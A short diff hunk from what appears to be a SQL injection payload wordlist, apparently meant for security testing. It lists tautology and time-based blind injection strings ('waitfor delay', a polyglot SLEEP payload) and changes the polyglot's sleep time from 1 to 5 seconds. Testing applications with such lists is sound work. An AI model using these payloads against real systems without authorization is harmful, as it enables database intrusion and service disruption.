@@ -16,4 +16,4 @@
 ' OR 1 = 1 -- -
 '; waitfor delay '0:30:0'--
 1; waitfor delay '0:30:0'--
-SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/
+SLEEP(5) /*’ or SLEEP(5) or’” or SLEEP(5) or “*/
